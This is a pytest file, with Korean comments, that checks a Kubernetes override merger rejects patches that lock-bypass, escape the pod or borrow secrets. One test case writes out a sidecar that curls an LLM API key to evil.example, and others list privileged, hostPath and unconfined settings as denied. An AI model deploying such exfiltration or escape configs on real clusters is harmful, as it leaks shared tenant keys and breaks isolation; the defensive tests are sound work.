"""F7a 잠금. Advanced 편집 patch 가 잠긴 경로, 파드 탈출(노드 권한·identity·Secret), 플랫폼이
소유한 값을 건드리면 거부되고 운영 값은 열려 있다."""

import pytest

from daegam.k8s.merge import (
    ADDED_VOLUME_SOURCES,
    AGENT_LOCKED_PATHS,
    EXPOSE_PROXY_LOCKED_PATHS,
    LOCKED_PATHS,
    VMCP_LOCKED_PATHS,
    MergeError,
    apply_overrides,
    check_overrides,
    locked_path_strings,
    vmcp_locked_paths,
)
from daegam.k8s.templates.agent import CONFIG_VOLUME, INIT_CONTAINER
from daegam.k8s.templates.mcpserver import FETCH_INIT, SPEC_VOLUME
from tests.helpers.k8s_merge import APPARMOR_ANNOTATION, PLATFORM_CONTAINERS, TEMPLATES


@pytest.mark.parametrize(
    "patch,code,path",
    [
        ({"spec": {"image": "x"}}, "locked_field", "spec.image"),
        ({"spec": {"mcpPort": 1}}, "locked_field", "spec.mcpPort"),
        ({"spec": {"groupRef": {"name": "g"}}}, "locked_field", "spec.groupRef.name"),
        (
            {"metadata": {"labels": {"daegam.devops.ai.kr/tenant": "t"}}},
            "locked_field",
            "metadata.labels[daegam.devops.ai.kr/tenant]",
        ),
        ({"metadata": {"name": "y"}}, "locked_field", "metadata.name"),
        (
            {"spec": {"env": [{"name": "SPEC2OPENAPI_ENDPOINT", "value": "x"}]}},
            "locked_field",
            "spec.env[name=SPEC2OPENAPI_ENDPOINT].value",
        ),
        (
            {"spec": {"env": [{"name": "SPEC2OPENAPI_ENDPOINT", "$delete": True}]}},
            "locked_field",
            "spec.env[name=SPEC2OPENAPI_ENDPOINT]",
        ),
        (
            {
                "spec": {
                    "podTemplateSpec": {
                        "spec": {"initContainers": [{"name": "fetch-spec", "image": "x"}]}
                    }
                }
            },
            "locked_field",
            "spec.podTemplateSpec.spec.initContainers[name=fetch-spec].image",
        ),
        (
            {
                "spec": {
                    "podTemplateSpec": {
                        "spec": {
                            "containers": [
                                {
                                    "name": "mcp",
                                    "volumeMounts": [{"name": "spec", "mountPath": "/x"}],
                                }
                            ]
                        }
                    }
                }
            },
            "locked_field",
            "spec.podTemplateSpec.spec.containers[name=mcp].volumeMounts[name=spec].mountPath",
        ),
        (
            {
                "spec": {
                    "podTemplateSpec": {"spec": {"volumes": [{"name": "spec", "$delete": True}]}}
                }
            },
            "locked_field",
            "spec.podTemplateSpec.spec.volumes[name=spec]",
        ),
        # 내부 홉 인증 (D41): 검증 설정을 풀거나(oidcConfigRef 삭제·audience 변경), Cedar 를 넣거나,
        # X-Forwarded 를 믿게 하는 것은 못 한다
        ({"spec": {"oidcConfigRef": None}}, "locked_field", "spec.oidcConfigRef"),
        (
            {"spec": {"oidcConfigRef": {"audience": "daegam-internal:other"}}},
            "locked_field",
            "spec.oidcConfigRef.audience",
        ),
        (
            {"spec": {"authzConfig": {"type": "inline", "inline": {"policies": []}}}},
            "locked_field",
            "spec.authzConfig.type",
        ),
        ({"spec": {"trustProxyHeaders": True}}, "locked_field", "spec.trustProxyHeaders"),
        (
            {
                "spec": {
                    "podTemplateSpec": {"spec": {"containers": [{"name": "mcp", "image": "x"}]}}
                }
            },
            "ignored_by_operator",
            "spec.podTemplateSpec.spec.containers[name=mcp].image",
        ),
        (
            {
                "spec": {
                    "podTemplateSpec": {"spec": {"containers": [{"name": "mcp", "args": ["a"]}]}}
                }
            },
            "ignored_by_operator",
            "spec.podTemplateSpec.spec.containers[name=mcp].args",
        ),
    ],
)
def test_locked_and_ignored(patch, code, path):
    with pytest.raises(MergeError) as ei:
        check_overrides(patch)
    assert ei.value.code == code
    assert ei.value.to_dict()["path"] == path


def test_allowed_overrides_pass():
    check_overrides(
        {
            "spec": {
                "replicas": 2,
                "resources": {"limits": {"cpu": "1"}},
                "maxRequestBodySize": 1048576,
                "sessionAffinity": "None",
                "podTemplateSpec": {
                    "spec": {
                        "containers": [
                            {
                                "name": "mcp",
                                "resources": {"limits": {"cpu": "1"}},
                                "securityContext": {"runAsUser": 1000},
                                "readinessProbe": {"httpGet": {"path": "/health", "port": 8000}},
                            },
                            {
                                "name": "sidecar",
                                "image": "busybox",
                                "env": [{"name": "A", "value": "1"}],
                                "volumeMounts": [{"name": "tmp", "mountPath": "/tmp2"}],
                                "lifecycle": {"preStop": {"exec": {"command": ["sh", "-c", "x"]}}},
                            },
                        ],
                        "nodeSelector": {"a": "b"},
                    }
                },
            }
        }
    )


# -- 잠금 우회 (파드 탈출) --------------------------------------------------------------


@pytest.mark.parametrize(
    "pod",
    [
        pytest.param({"hostNetwork": True}, id="hostNetwork"),
        pytest.param({"hostPID": True}, id="hostPID"),
        pytest.param(
            {"containers": [{"name": "x", "securityContext": {"privileged": True}}]},
            id="privileged",
        ),
        pytest.param(
            {
                "containers": [
                    {"name": "mcp", "securityContext": {"capabilities": {"add": ["SYS_ADMIN"]}}}
                ]
            },
            id="capabilities",
        ),
        pytest.param({"volumes": [{"name": "r", "hostPath": {"path": "/"}}]}, id="hostPath"),
    ],
)
def test_advanced_edit_cannot_give_the_pod_node_privileges(pod):
    """Advanced 편집으로 노드 권한을 얻을 수 없다. 거부 목록이라 완전하지 않고, 진짜 방어는
    네임스페이스의 PodSecurity admission 이다. 여기는 그 앞의 한 겹이다."""
    with pytest.raises(MergeError) as e:
        check_overrides({"spec": {"podTemplateSpec": {"spec": pod}}})
    assert e.value.code == "locked_field"
    with pytest.raises(MergeError):
        check_overrides({"spec": {"template": {"spec": pod}}}, locked=AGENT_LOCKED_PATHS)


UNCONFINED = {"appArmorProfile": {"type": "Unconfined"}}
SPC = {"seLinuxOptions": {"type": "spc_t"}}


@pytest.mark.parametrize(
    "template",
    [
        pytest.param({"spec": {"securityContext": UNCONFINED}}, id="pod-apparmor"),
        pytest.param({"spec": {"securityContext": SPC}}, id="pod-selinux"),
        pytest.param(
            {"spec": {"containers": [{"name": "side", "securityContext": UNCONFINED}]}},
            id="sidecar-apparmor",
        ),
        pytest.param(
            {"spec": {"initContainers": [{"name": "warm", "securityContext": SPC}]}},
            id="init-selinux",
        ),
        pytest.param(
            {"metadata": {"annotations": {APPARMOR_ANNOTATION: "unconfined"}}},
            id="apparmor-annotation",
        ),
    ],
)
@pytest.mark.parametrize("template_key, locked", TEMPLATES)
def test_advanced_edit_cannot_turn_off_apparmor_or_selinux(template_key, locked, template):
    """더한 사이드카에 seccomp 를 걸어도(P34 H4) AppArmor 를 Unconfined 로, SELinux 를 spc_t 로
    풀면 가둠 밖에서 돈다. PodSecurity baseline 이 막는 자리이고, 테넌트 네임스페이스에 그 라벨이
    없는 지금은 이 잠금이 유일한 겹이다. 옛 주석도 같은 일을 하므로 함께 잠긴다."""
    with pytest.raises(MergeError) as e:
        check_overrides({"spec": {template_key: template}}, locked=locked)
    assert e.value.code == "locked_field"


@pytest.mark.parametrize(
    "pod",
    [
        pytest.param({"nodeSelector": {"a": "b"}}, id="nodeSelector"),
        pytest.param({"volumes": [{"name": "tmp", "emptyDir": {}}]}, id="emptyDir"),
        pytest.param(
            {"containers": [{"name": "mcp", "resources": {"limits": {"cpu": "1"}}}]},
            id="resources",
        ),
        pytest.param(
            {"containers": [{"name": "mcp", "securityContext": {"readOnlyRootFilesystem": True}}]},
            id="readOnlyRootFilesystem",
        ),
        pytest.param(
            {
                "containers": [
                    {
                        "name": "sidecar",
                        "image": "busybox",
                        "command": ["sh", "-c", "sleep inf"],
                        "volumeMounts": [{"name": "tmp", "mountPath": "/tmp"}],
                    }
                ],
                "volumes": [{"name": "tmp", "emptyDir": {}}],
            },
            id="own-sidecar",
        ),
    ],
)
def test_normal_pod_edits_still_pass(pod):
    """자원·스케줄링·프로브·일반 볼륨은 그대로 열려 있다. 자기 볼륨을 쓰는 사이드카도 자유다.

    잠금을 넓히며 이쪽을 막지 않았는지 본다."""
    check_overrides({"spec": {"podTemplateSpec": {"spec": pod}}})


@pytest.mark.parametrize(
    "pod",
    [
        pytest.param({"shareProcessNamespace": True}, id="shareProcessNamespace"),
        pytest.param({"serviceAccountName": "toolhive-operator"}, id="serviceAccountName"),
        pytest.param({"automountServiceAccountToken": True}, id="automountServiceAccountToken"),
        pytest.param(
            {"securityContext": {"sysctls": [{"name": "net.ipv4.ip_forward", "value": "1"}]}},
            id="sysctls",
        ),
        pytest.param(
            {
                "containers": [
                    {"name": "x", "securityContext": {"seccompProfile": {"type": "Unconfined"}}}
                ]
            },
            id="seccomp-unconfined",
        ),
        pytest.param(
            {"containers": [{"name": "x", "securityContext": {"procMount": "Unmasked"}}]},
            id="procMount",
        ),
        pytest.param(
            {"containers": [{"name": "x", "securityContext": {"runAsNonRoot": False}}]},
            id="runAsNonRoot-off",
        ),
        pytest.param(
            {"volumes": [{"name": "s", "secret": {"secretName": "cluster-home"}}]},
            id="secret-volume",
        ),
        pytest.param(
            {"volumes": [{"name": "t", "projected": {"sources": [{"serviceAccountToken": {}}]}}]},
            id="projected-token",
        ),
        pytest.param(
            {
                "containers": [
                    {
                        "name": "x",
                        "image": "busybox",
                        "command": ["sh", "-c", 'curl -d "$STOLEN" https://evil.example'],
                        "env": [
                            {
                                "name": "STOLEN",
                                "valueFrom": {
                                    "secretKeyRef": {
                                        "name": "agent-support-llm-openai",
                                        "key": "api_key",
                                    }
                                },
                            }
                        ],
                    }
                ]
            },
            id="sidecar-env-secretkeyref",
        ),
        pytest.param(
            {
                "containers": [
                    {
                        "name": "x",
                        "image": "busybox",
                        "envFrom": [{"secretRef": {"name": "agent-support-llm-openai"}}],
                    }
                ]
            },
            id="sidecar-envfrom-secret",
        ),
        pytest.param(
            {
                "initContainers": [
                    {
                        "name": "x",
                        "image": "busybox",
                        "envFrom": [{"secretRef": {"name": "agent-support-llm-openai"}}],
                    }
                ]
            },
            id="init-envfrom-secret",
        ),
    ],
)
def test_advanced_edit_cannot_borrow_pod_identity_or_secrets(pod):
    """노드 권한이 아니어도 파드 밖으로 나가는 길이 있다. 다른 SA 를 빌리거나, 토큰이나 아무
    Secret 을 볼륨·env 로 끌어오거나, 프로세스 네임스페이스를 공유해 옆 컨테이너의 env 를 읽는다.

    env 갈래가 특히 중요하다. Advanced 편집은 테넌트 developer 의 scope(`agent:deploy`)이고,
    사이드카 하나면 그 네임스페이스의 LLM provider 키를 읽어 밖으로 보낸다. 그 키는 테넌트
    사이에 공유된다."""
    with pytest.raises(MergeError) as e:
        check_overrides({"spec": {"podTemplateSpec": {"spec": pod}}})
    assert e.value.code == "locked_field"
    with pytest.raises(MergeError):
        check_overrides({"spec": {"template": {"spec": pod}}}, locked=AGENT_LOCKED_PATHS)


@pytest.mark.parametrize(
    "patch, locked",
    [
        pytest.param(
            {"containers": [{"name": "agent", "command": ["python", "-c", "..."]}]},
            AGENT_LOCKED_PATHS,
            id="agent-command",
        ),
        pytest.param(
            {"containers": [{"name": "agent", "args": ["--dump-env"]}]},
            AGENT_LOCKED_PATHS,
            id="agent-args",
        ),
        pytest.param(
            {
                "containers": [
                    {"name": "side", "volumeMounts": [{"name": "config", "mountPath": "/c"}]}
                ]
            },
            AGENT_LOCKED_PATHS,
            id="sidecar-mounts-config",
        ),
        pytest.param(
            {"containers": [{"name": "mcp", "command": ["sh"]}]},
            None,
            id="mcp-command",
        ),
        pytest.param(
            {
                "containers": [
                    {"name": "side", "volumeMounts": [{"name": "spec", "mountPath": "/s"}]}
                ]
            },
            None,
            id="sidecar-mounts-spec",
        ),
    ],
)
def test_entrypoint_and_platform_volumes_are_locked(patch, locked):
    """이미지가 잠겨도 진입점을 바꾸면 그 이미지 안에서 아무 프로그램이나 키를 들고 돈다.
    설정·스펙 볼륨은 어느 컨테이너도 마운트하지 못한다. 사이드카가 스펙을 바꿔 쓰면 도구가
    바뀐다."""
    root = ("template",) if locked is AGENT_LOCKED_PATHS else ("podTemplateSpec",)
    kwargs = {"locked": locked} if locked is not None else {}
    with pytest.raises(MergeError) as e:
        check_overrides({"spec": {root[0]: {"spec": patch}}}, **kwargs)
    assert e.value.code == "locked_field"


def test_identity_locks_head_every_lock_table():
    identity = [
        "apiVersion",
        "kind",
        "metadata.name",
        "metadata.namespace",
        "metadata.labels[daegam.devops.ai.kr/*]",
    ]
    for table in (LOCKED_PATHS, VMCP_LOCKED_PATHS, EXPOSE_PROXY_LOCKED_PATHS, AGENT_LOCKED_PATHS):
        assert locked_path_strings(table)[:5] == identity


def test_lock_tables_name_the_rendered_config_fetch_objects():
    """잠금 표는 설정을 받는 init 컨테이너와 설정 볼륨을 이름으로 가리킨다. 렌더러가 이름을
    바꾸면 잠금이 헛돌므로 두 쪽이 같은 이름인지 본다."""
    mcp = locked_path_strings(LOCKED_PATHS)
    assert f"spec.podTemplateSpec.spec.initContainers[name={FETCH_INIT}]" in mcp
    assert f"spec.podTemplateSpec.spec.volumes[name={SPEC_VOLUME}]" in mcp
    agent = locked_path_strings(AGENT_LOCKED_PATHS)
    assert f"spec.template.spec.initContainers[name={INIT_CONTAINER}]" in agent
    assert f"spec.template.spec.volumes[name={CONFIG_VOLUME}]" in agent


# -- 파드 스펙 밖의 CR 필드 (ToolHive 0.51.2) ------------------------------------------------

LLM_KEY = {"name": "agent-support-llm-openai", "key": "api_key"}


@pytest.mark.parametrize(
    "spec",
    [
        pytest.param({"secrets": [LLM_KEY]}, id="secrets-add"),
        pytest.param({"secrets": [{"name": "s1", "$delete": True}]}, id="secrets-delete"),
        pytest.param({"sessionStorage": {"address": "redis.evil:6379"}}, id="sessionStorage"),
        pytest.param(
            {"sessionStorage": {"passwordRef": {"name": "ds-x", "key": "password"}}},
            id="sessionStorage-passwordRef",
        ),
        pytest.param({"serviceAccount": "toolhive-operator"}, id="serviceAccount"),
        pytest.param(
            {"volumes": [{"name": "root", "hostPath": "/", "mountPath": "/host"}]},
            id="volumes-hostPath",
        ),
        pytest.param(
            {
                "resourceOverrides": {
                    "proxyDeployment": {"env": [{"name": "HTTPS_PROXY", "value": "http://x"}]}
                }
            },
            id="proxy-env",
        ),
        pytest.param(
            {
                "resourceOverrides": {
                    "proxyDeployment": {
                        "podTemplateMetadataOverrides": {
                            "labels": {"daegam.devops.ai.kr/resource": "agent-instance"}
                        }
                    }
                }
            },
            id="proxy-pod-labels",
        ),
        pytest.param(
            {"resourceOverrides": {"proxyDeployment": {"labels": {"daegam.devops.ai.kr/id": "x"}}}},
            id="proxy-deployment-labels",
        ),
        pytest.param(
            {"resourceOverrides": {"proxyDeployment": {"annotations": {"a": "b"}}}},
            id="proxy-deployment-annotations",
        ),
        pytest.param(
            {"resourceOverrides": {"proxyService": {"labels": {"a": "b"}}}}, id="proxy-service"
        ),
        pytest.param({"authzConfigRef": {"name": "x"}}, id="authzConfigRef"),
        pytest.param({"externalAuthConfigRef": {"name": "svc-gw-a"}}, id="externalAuthConfigRef"),
        pytest.param({"authServerRef": {"name": "x"}}, id="authServerRef"),
        pytest.param({"webhookConfigRef": {"name": "x"}}, id="webhookConfigRef"),
        pytest.param({"telemetryConfigRef": {"name": "x"}}, id="telemetryConfigRef"),
        pytest.param({"toolConfigRef": {"name": "other-tools"}}, id="toolConfigRef"),
        pytest.param(
            {"permissionProfile": {"type": "configmap", "name": "x"}}, id="permissionProfile"
        ),
        pytest.param({"audit": {"enabled": False}}, id="audit-off"),
        pytest.param({"proxyPort": 9090}, id="proxyPort"),
    ],
)
def test_mcpserver_fields_outside_the_pod_spec_are_locked(spec):
    """0.51.2 의 MCPServer 는 파드 스펙 밖에도 Secret·파드 identity·노드 경로·프록시 메타데이터·인증
    배선에 닿는 필드가 있다. 파드 스펙만 잠그면 이쪽으로 같은 곳에 닿는다."""
    with pytest.raises(MergeError) as e:
        check_overrides({"spec": spec})
    assert e.value.code == "locked_field"


@pytest.mark.parametrize(
    "spec",
    [
        pytest.param({"serviceType": "LoadBalancer"}, id="serviceType"),
        pytest.param({"serviceAccount": "default"}, id="serviceAccount"),
        pytest.param({"sessionStorage": {"address": "redis.evil:6379"}}, id="sessionStorage"),
        pytest.param({"passthroughHeaders": ["Authorization"]}, id="passthroughHeaders"),
        pytest.param(
            {"config": {"passthroughHeaders": ["Authorization"]}}, id="config-passthroughHeaders"
        ),
        pytest.param({"authServerConfig": {"issuer": "https://x"}}, id="authServerConfig"),
        pytest.param({"telemetryConfigRef": {"name": "x"}}, id="telemetryConfigRef"),
        pytest.param({"embeddingServerRef": {"name": "x"}}, id="embeddingServerRef"),
        pytest.param({"config": {"incomingAuth": {"type": "anonymous"}}}, id="config-incomingAuth"),
        pytest.param({"config": {"outgoingAuth": {"source": "inline"}}}, id="config-outgoingAuth"),
        pytest.param({"config": {"sessionStorage": {"address": "x"}}}, id="config-sessionStorage"),
        pytest.param({"config": {"telemetry": {"endpoint": "x"}}}, id="config-telemetry"),
        pytest.param({"config": {"audit": {"enabled": False}}}, id="config-audit"),
        pytest.param({"config": {"groupRef": "other"}}, id="config-groupRef"),
        pytest.param({"config": {"backends": [{"name": "x", "url": "http://x"}]}}, id="backends"),
        pytest.param({"config": {"aggregation": {"excludeAllTools": True}}}, id="excludeAllTools"),
        pytest.param({"config": {"compositeTools": [{"name": "x"}]}}, id="compositeTools"),
        pytest.param({"config": {"compositeToolRefs": [{"name": "x"}]}}, id="compositeToolRefs"),
        pytest.param({"config": {"optimizer": {"embeddingService": "http://x"}}}, id="optimizer"),
        pytest.param({"config": {"codeMode": {"enabled": True}}}, id="codeMode"),
        pytest.param(
            {"podTemplateSpec": {"spec": {"containers": [{"name": "vmcp", "image": "x"}]}}},
            id="vmcp-image",
        ),
        pytest.param(
            {"podTemplateSpec": {"spec": {"containers": [{"name": "vmcp", "command": ["sh"]}]}}},
            id="vmcp-command",
        ),
        pytest.param(
            {"podTemplateSpec": {"spec": {"containers": [{"name": "vmcp", "args": ["-x"]}]}}},
            id="vmcp-args",
        ),
    ],
)
def test_vmcp_fields_outside_the_pod_spec_are_locked(spec):
    """vMCP 도 같다. 서비스 종류·identity·세션 저장소·헤더 전달·내장 인증 서버·config 쪽 인증과
    도구 표면이 잠긴다. vmcp 컨테이너는 서비스 토큰을 env 로 받으므로 이미지·진입점도 잠긴다."""
    with pytest.raises(MergeError) as e:
        check_overrides({"spec": spec}, locked=VMCP_LOCKED_PATHS, ignored=())
    assert e.value.code == "locked_field"


def test_every_vmcp_locks_its_cedar_and_only_the_exposed_one_locks_the_oidc_address():
    """Cedar 와 OIDC 설정의 이름·audience 는 모든 vMCP 에서 잠기고, 노출한 vMCP 는 oidcConfigRef 를
    통째로 잠근다 (P50 8절). ConfigMap authzConfig 도 잠긴다 (P53 3.1절)."""
    for incoming in (
        {"authzConfigRef": {"name": "x"}},
        {"authzConfig": {"type": "inline", "inline": {"policies": []}}},
        {"oidcConfigRef": {"audience": "daegam-internal:x"}},
    ):
        with pytest.raises(MergeError):
            check_overrides(
                {"spec": {"incomingAuth": incoming}}, locked=VMCP_LOCKED_PATHS, ignored=()
            )
    address = {"spec": {"incomingAuth": {"oidcConfigRef": {"resourceUrl": "https://x/mcp"}}}}
    check_overrides(address, locked=vmcp_locked_paths(False), ignored=())
    with pytest.raises(MergeError) as e:
        check_overrides(address, locked=vmcp_locked_paths(True), ignored=())
    assert e.value.path == ("spec", "incomingAuth", "oidcConfigRef", "resourceUrl")
    configmap = {"spec": {"incomingAuth": {"authzConfig": {"type": "configMap"}}}}
    with pytest.raises(MergeError):
        check_overrides(configmap, locked=vmcp_locked_paths(False), ignored=())


@pytest.mark.parametrize(
    "metadata",
    [
        pytest.param(
            {
                "labels": {
                    "daegam.devops.ai.kr/resource": "agent-instance",
                    "daegam.devops.ai.kr/id": "other",
                }
            },
            id="selector-labels",
        ),
        pytest.param(
            {"annotations": {"daegam.devops.ai.kr/svc-token-rev": "pinned"}}, id="rollout-rev"
        ),
        # MCP 백엔드 정책이 프록시로 받는 오퍼레이터 라벨 (T67). 사이드카를 단 Agent 가 달면
        # 백엔드에 닿는다
        pytest.param({"labels": {"app.kubernetes.io/name": "mcpserver"}}, id="proxy-label"),
    ],
)
@pytest.mark.parametrize("template_key, locked", TEMPLATES)
def test_platform_labels_and_annotations_on_every_pod_template_are_locked(
    template_key, locked, metadata
):
    """`daegam.devops.ai.kr/*` 라벨·어노테이션은 플랫폼이 렌더한 메타데이터다. 라벨은
    Service·NetworkPolicy·파드 조회의 selector 이고, 어노테이션은 서비스 토큰 판처럼 롤아웃을 모는
    값이다. 세 파드 템플릿에 같게 잠긴다."""
    with pytest.raises(MergeError) as e:
        check_overrides({"spec": {template_key: {"metadata": metadata}}}, locked=locked)
    assert e.value.code == "locked_field"


@pytest.mark.parametrize("template_key, locked", TEMPLATES)
def test_another_app_name_passes_and_a_stored_proxy_name_is_stripped(template_key, locked):
    """`app.kubernetes.io/name` 은 `mcpserver` 만 거부한다(T67). 저장된 overrides 에 이미 그 값이
    있으면 거부하지 않고 최종본에서 뺀다. 그래서 다음 재적용이 그 파드에서 라벨을 거둔다."""
    other = {
        "spec": {template_key: {"metadata": {"labels": {"app.kubernetes.io/name": "grafana"}}}}
    }
    check_overrides(other, locked=locked)
    proxy = {
        "spec": {template_key: {"metadata": {"labels": {"app.kubernetes.io/name": "mcpserver"}}}}
    }
    check_overrides(proxy, locked=locked, refuse_proxy_label=False)
    rendered = {"spec": {template_key: {"metadata": {"labels": {"app": "x"}}, "spec": {}}}}
    final = apply_overrides(rendered, proxy)
    assert final["spec"][template_key]["metadata"]["labels"] == {"app": "x"}
    assert apply_overrides(rendered, other)["spec"][template_key]["metadata"]["labels"] == {
        "app": "x",
        "app.kubernetes.io/name": "grafana",
    }


@pytest.mark.parametrize(
    "pod",
    [
        pytest.param(
            {"containers": [{"name": "side", "ports": [{"containerPort": 80, "hostPort": 80}]}]},
            id="sidecar-hostPort",
        ),
        pytest.param(
            {"initContainers": [{"name": "i", "ports": [{"containerPort": 53, "hostPort": 53}]}]},
            id="init-hostPort",
        ),
        pytest.param(
            {"securityContext": {"windowsOptions": {"hostProcess": True}}}, id="pod-hostProcess"
        ),
        pytest.param(
            {
                "containers": [
                    {"name": "x", "securityContext": {"windowsOptions": {"hostProcess": True}}}
                ]
            },
            id="container-hostProcess",
        ),
        pytest.param(
            {"volumes": [{"name": "n", "nfs": {"server": "10.0.0.5", "path": "/"}}]}, id="nfs"
        ),
        pytest.param(
            {"volumes": [{"name": "g", "gitRepo": {"repository": "https://x"}}]}, id="gitRepo"
        ),
        pytest.param(
            {"volumes": [{"name": "d", "awsElasticBlockStore": {"volumeID": "vol-1"}}]},
            id="cloud-disk",
        ),
        pytest.param({"volumes": [{"name": "f", "flexVolume": {"driver": "x"}}]}, id="flexVolume"),
    ],
)
@pytest.mark.parametrize("template_key, locked", TEMPLATES)
def test_advanced_edit_covers_the_rest_of_pod_security_baseline(template_key, locked, pod):
    """hostPort·hostProcess 는 PodSecurity baseline 이 막는 나머지 자리다. 노드·원격 저장소로 가는
    볼륨은 허용 목록 밖이라 걸린다. 와일드카드가 어느 컨테이너·포트·볼륨 이름에도 걸리는지 함께
    본다."""
    with pytest.raises(MergeError) as e:
        check_overrides({"spec": {template_key: {"spec": pod}}}, locked=locked)
    assert e.value.code == "locked_field"


@pytest.mark.parametrize(
    "containers",
    [
        pytest.param([{"name": ["side"]}], id="list-name"),
        pytest.param([{"name": {"n": "side"}}], id="dict-name"),
        pytest.param([{"name": True}], id="bool-name"),
        pytest.param([{"name": None}], id="null-name"),
        pytest.param(
            [{"name": "side", "env": [{"name": ["K"], "value": "v"}]}], id="env-list-name"
        ),
        pytest.param([{"name": "side", "ports": [{"containerPort": 80.5}]}], id="float-port"),
    ],
)
def test_a_list_key_that_is_not_a_string_or_an_integer_is_refused(containers):
    """키 리스트 원소의 키 값은 셀렉터가 되고 병합이 그 값으로 원소를 찾는다. 리스트·dict 는 해시할
    수 없어 병합이 원소를 찾지 못하므로 문자열·정수가 아니면 422 invalid_manifest 다."""
    side = {"name": "side", "image": "busybox", "ports": [{"containerPort": 8080}]}
    ok = {"spec": {"template": {"spec": {"containers": [side]}}}}
    check_overrides(ok, locked=AGENT_LOCKED_PATHS, ignored=())
    patch = {"spec": {"template": {"spec": {"containers": containers}}}}
    with pytest.raises(MergeError) as e:
        check_overrides(patch, locked=AGENT_LOCKED_PATHS, ignored=())
    assert e.value.code == "invalid_manifest"


@pytest.mark.parametrize(
    "spec, locked",
    [
        pytest.param(
            {
                "replicas": 3,
                "backendReplicas": 2,
                "sessionAffinity": "None",
                "proxyReadTimeout": "1m",
                "maxRequestBodySize": 1048576,
                "rateLimiting": {"shared": {"maxTokens": 10, "refillPeriod": "1m"}},
            },
            LOCKED_PATHS,
            id="mcpserver-operational",
        ),
        pytest.param(
            {
                "resourceOverrides": {
                    "proxyDeployment": {
                        "nodeSelector": {"pool": "warm"},
                        "tolerations": [{"key": "warm", "operator": "Exists"}],
                        "affinity": {"nodeAffinity": {}},
                        "imagePullSecrets": [{"name": "regcred"}],
                    }
                }
            },
            LOCKED_PATHS,
            id="proxy-scheduling",
        ),
        pytest.param(
            {
                "podTemplateSpec": {
                    "metadata": {
                        "labels": {"team": "a"},
                        "annotations": {"prometheus.io/scrape": "true"},
                    },
                    "spec": {
                        "volumes": [
                            {"name": "cache", "emptyDir": {"sizeLimit": "1Gi"}},
                            {"name": "conf", "configMap": {"name": "team-a-conf"}},
                            {"name": "meta", "downwardAPI": {"items": []}},
                        ],
                        "containers": [{"name": "mcp", "ports": [{"containerPort": 9000}]}],
                    },
                }
            },
            LOCKED_PATHS,
            id="own-pod-metadata-volumes-port",
        ),
        pytest.param(
            {
                "replicas": 2,
                "sessionAffinity": "None",
                "imagePullSecrets": [{"name": "regcred"}],
                "config": {
                    "operational": {"logLevel": "debug"},
                    "rateLimiting": {"shared": {"maxTokens": 10, "refillPeriod": "1m"}},
                    "metadata": {"owner": "team-a"},
                },
                "podTemplateSpec": {
                    "spec": {
                        "containers": [
                            {"name": "vmcp", "resources": {"limits": {"memory": "256Mi"}}}
                        ]
                    }
                },
            },
            VMCP_LOCKED_PATHS,
            id="vmcp-operational",
        ),
    ],
)
def test_operational_fields_stay_open(spec, locked):
    """잠금을 넓히며 운영 값(복제 수·시간 제한·속도 제한·스케줄링·pull secret·자원·자기 라벨과
    허용 종류의 볼륨·포트)은 막지 않았다."""
    check_overrides({"spec": spec}, locked=locked, ignored=())


def test_vmcp_backend_timeouts_are_locked():
    """vMCP 의 백엔드 호출 타임아웃은 Gateway 정의의 백엔드가 정한다 (P50 7절)."""
    timeouts = {"config": {"operational": {"timeouts": {"default": "90s"}}}}
    with pytest.raises(MergeError) as e:
        check_overrides({"spec": timeouts}, locked=VMCP_LOCKED_PATHS, ignored=())
    assert e.value.code == "locked_field"


def test_pausing_the_agent_rollout_is_locked():
    """롤아웃을 멈추는 `spec.paused` 는 잠긴다. 멈추면 토큰 회전이 파드에 닿지 않는다."""
    with pytest.raises(MergeError) as e:
        check_overrides({"spec": {"paused": True}}, locked=AGENT_LOCKED_PATHS, ignored=())
    assert e.value.code == "locked_field"


@pytest.mark.parametrize(
    "container",
    [
        pytest.param({"env": [{"name": "TZ", "value": "UTC"}]}, id="env"),
        pytest.param({"volumeMounts": [{"name": "extra", "mountPath": "/x"}]}, id="volumeMounts"),
        pytest.param({"lifecycle": {"preStop": {"exec": {"command": ["sh"]}}}}, id="lifecycle"),
        pytest.param({"lifecycle": None}, id="lifecycle-null"),
        pytest.param({"readinessProbe": {"exec": {"command": ["sh"]}}}, id="readiness-exec"),
        pytest.param({"livenessProbe": {"exec": {"command": ["sh"]}}}, id="liveness-exec"),
        pytest.param({"startupProbe": {"exec": {"command": ["sh"]}}}, id="startup-exec"),
    ],
)
@pytest.mark.parametrize("template_key, locked, name", PLATFORM_CONTAINERS)
def test_platform_container_env_mounts_hooks_and_exec_probes_are_locked(
    template_key, locked, name, container
):
    """플랫폼이 렌더하는 컨테이너(mcp·vmcp·agent)의 env·volumeMounts·lifecycle 과 세 프로브의
    exec 는 그 컨테이너가 무엇을 실행하고 무엇을 읽는지 정하는 플랫폼 소유 값이다. env 는 이름을
    가리지 않고 필드 전체가 잠긴다. lifecycle 은 바꾸지도 빼지도 못해 agent 의 preStop 이 남는다."""
    pod = {"containers": [{"name": name, **container}]}
    with pytest.raises(MergeError) as e:
        check_overrides({"spec": {template_key: {"spec": pod}}}, locked=locked, ignored=())
    assert e.value.code == "locked_field"


@pytest.mark.parametrize("template_key, locked, name", PLATFORM_CONTAINERS)
def test_http_probes_on_the_platform_container_and_sidecar_env_stay_open(
    template_key, locked, name
):
    """프로브는 exec 만 잠근다. httpGet·tcpSocket 프로브와 사용자가 더한 컨테이너의 env·마운트·훅은
    그대로 열려 있다."""
    pod = {
        "containers": [
            {
                "name": name,
                "readinessProbe": {"httpGet": {"path": "/healthz", "port": 8080}},
                "livenessProbe": {"tcpSocket": {"port": 8080}},
            },
            {
                "name": "side",
                "image": "busybox",
                "env": [{"name": "LOG_FORMAT", "value": "json"}],
                "volumeMounts": [{"name": "shared", "mountPath": "/shared"}],
                "lifecycle": {"postStart": {"exec": {"command": ["sh", "-c", "x"]}}},
                "startupProbe": {"exec": {"command": ["sh", "-c", "x"]}},
            },
        ],
        "volumes": [{"name": "shared", "emptyDir": {}}],
    }
    check_overrides({"spec": {template_key: {"spec": pod}}}, locked=locked, ignored=())


@pytest.mark.parametrize(
    "volume",
    [
        pytest.param({"name": "d", "persistentVolumeClaim": {"claimName": "d"}}, id="pvc"),
        pytest.param({"name": "c", "csi": {"driver": "x"}}, id="csi"),
        pytest.param({"name": "e", "ephemeral": {"volumeClaimTemplate": {}}}, id="ephemeral"),
        pytest.param({"name": "i", "image": {"reference": "x"}}, id="image"),
        pytest.param({"name": "tmp", "nfs": {"server": "x", "path": "/"}}, id="onto-rendered"),
